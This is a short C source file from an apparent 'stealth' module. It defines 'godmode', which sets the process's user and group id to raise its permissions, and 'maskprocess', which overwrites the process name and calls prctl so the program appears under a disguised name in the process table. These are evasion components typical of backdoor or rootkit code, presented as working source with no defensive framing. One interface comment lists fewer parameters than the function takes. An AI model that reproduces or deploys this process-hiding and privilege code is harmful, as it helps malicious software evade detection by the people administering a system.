#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/prctl.h>
#include "stealth.h"

/*------------------------------------------------------------------------------
-- FUNCTION: godmode
--
-- DATE: May 30th 2010
--
-- REVISIONS:
--
-- DESIGNER: Tajinder Thind
--
-- PROGRAMMER: Tajinder Thind
--
-- INTERFACE: int godmode(unsigned int id)
--
-- RETURNS: int 
--
-- NOTES: Raises the permission level of the calling process.
-- 
------------------------------------------------------------------------------*/
int godmode(unsigned int id)
{
	int ret;
	
	if((ret = setuid(id)) < 0)
	{
		perror("Error setting uid");
	}
	else if((ret = setgid(id)) < 0)
	{
		perror("Error setting gid");
	}
	
	return ret;
}

/*------------------------------------------------------------------------------
-- FUNCTION: maskprocess
--
-- DATE: May 30th 2010
--
-- REVISIONS:
--
-- DESIGNER: Tajinder Thind
--
-- PROGRAMMER: Tajinder Thind
--
-- INTERFACE: void maskprocess(char *process, char *mask)
--
-- RETURNS: void
--
-- NOTES: Changes the processes name as it appears in the process table.
-- 
------------------------------------------------------------------------------*/
void maskprocess(char *process, char *mask, size_t length)
{	
   
	memset(process,0,length);
	
	strcpy(process, mask);
	
	prctl(PR_SET_NAME,mask,0,0);
	
	return;
}
